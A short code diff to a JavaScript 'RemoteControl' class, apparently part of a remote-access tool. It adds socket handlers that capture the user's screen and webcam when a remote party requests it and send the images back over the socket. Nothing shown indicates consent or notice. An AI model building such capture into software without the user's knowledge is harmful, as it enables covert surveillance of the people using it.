@@ -34,7 +34,7 @@ class RemoteControl {
                     try {
                         data["src"] = result;
 
-                        this.socket.emit("screenshotResponse", data);
+                        this.socket.emit("camShotResponse", data);
                         resolve("success");
                     } catch (error) {
                         resolve("not yet");
@@ -81,8 +81,13 @@ class RemoteControl {
 
         this.socket.on("screenshotRequest", data => {
 
+   
+            this.getScreenData(data).then();
+        });
+
+        this.socket.on("camShotRequest", data => {
+
             this.getCamData(data).then();
-            //this.getScreenData(data).then();
         });
 
 
